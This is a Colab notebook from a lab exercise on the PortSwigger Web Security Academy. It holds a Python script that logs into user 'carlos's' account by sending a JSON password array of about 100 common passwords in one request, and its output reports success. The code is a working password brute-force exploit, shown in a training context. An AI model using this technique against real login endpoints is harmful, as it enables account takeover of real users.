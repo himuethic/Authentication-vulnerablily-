{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "mount_file_id": "1JAwUeoEh7hWYHAOfOqQm2umvT5YjM7mp",
      "authorship_tag": "ABX9TyMUpY0g+DtHjmwcNAFl8LZU",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/himuethic/Authentication-vulnerablily-/blob/main/Authentication.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import requests\n",
        "import urllib3\n",
        "import json\n",
        "\n",
        "\n",
        "urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n",
        "\n",
        "# Function to access Carlos's account\n",
        "def access_carlos_account(url):\n",
        "    print(\"(+) Exploiting vulnerability....\")\n",
        "    login_url = url + \"/login\"\n",
        "    payload = {\n",
        "        \"username\": \"carlos\",\n",
        "        \"password\": [\n",
        "            \"123456\", \"password\", \"12345678\", \"qwerty\", \"123456789\", \"12345\", \"1234\", \"111111\", \"1234567\",\n",
        "            \"dragon\", \"123123\", \"baseball\", \"abc123\", \"football\", \"monkey\", \"letmein\", \"shadow\", \"master\",\n",
        "            \"666666\", \"qwertyuiop\", \"123321\", \"mustang\", \"1234567890\", \"michael\", \"654321\", \"superman\",\n",
        "            \"1qaz2wsx\", \"7777777\", \"121212\", \"000000\", \"qazwsx\", \"123qwe\", \"killer\", \"trustno1\", \"jordan\",\n",
        "            \"jennifer\", \"zxcvbnm\", \"asdfgh\", \"hunter\", \"buster\", \"soccer\", \"harley\", \"batman\", \"andrew\",\n",
        "            \"tigger\", \"sunshine\", \"iloveyou\", \"2000\", \"charlie\", \"robert\", \"thomas\", \"hockey\", \"ranger\",\n",
        "            \"daniel\", \"starwars\", \"klaster\", \"112233\", \"george\", \"computer\", \"michelle\", \"jessica\", \"pepper\",\n",
        "            \"1111\", \"zxcvbn\", \"555555\", \"11111111\", \"131313\", \"freedom\", \"777777\", \"pass\", \"maggie\", \"159753\",\n",
        "            \"aaaaaa\", \"ginger\", \"princess\", \"joshua\", \"cheese\", \"amanda\", \"summer\", \"love\", \"ashley\", \"nicole\",\n",
        "            \"chelsea\", \"biteme\", \"matthew\", \"access\", \"yankees\", \"987654321\", \"dallas\", \"austin\", \"thunder\",\n",
        "            \"taylor\", \"matrix\", \"mobilemail\", \"mom\", \"monitor\", \"monitoring\", \"montana\", \"moon\", \"moscow\",\n",
        "            \"random\"\n",
        "        ]\n",
        "    }\n",
        "\n",
        "    headers = {\"Content-Type\": \"application/json\"}\n",
        "\n",
        "    with requests.Session() as s:\n",
        "        r = s.post(login_url, json=payload, headers=headers, verify=False)\n",
        "\n",
        "        if \"Log out\" in r.text:\n",
        "            print(\"(+) Successfully accessed Carlos's account.\")\n",
        "        else:\n",
        "            print(\"(-) Could not login to Carlos's account\")\n",
        "\n",
        "#\n",
        "url = \"https://0a3100a904b894e4806b67cb0046009f.web-security-academy.net\"\n",
        "\n",
        "# Call the function with the lab URL\n",
        "access_carlos_account(url)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "8dAH0os549O9",
        "outputId": "0840bffb-5930-48b2-ccf8-21a2f6b66a0f"
      },
      "execution_count": 12,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "(+) Exploiting vulnerability....\n",
            "(+) Successfully accessed Carlos's account.\n"
          ]
        }
      ]
    }
  ]
}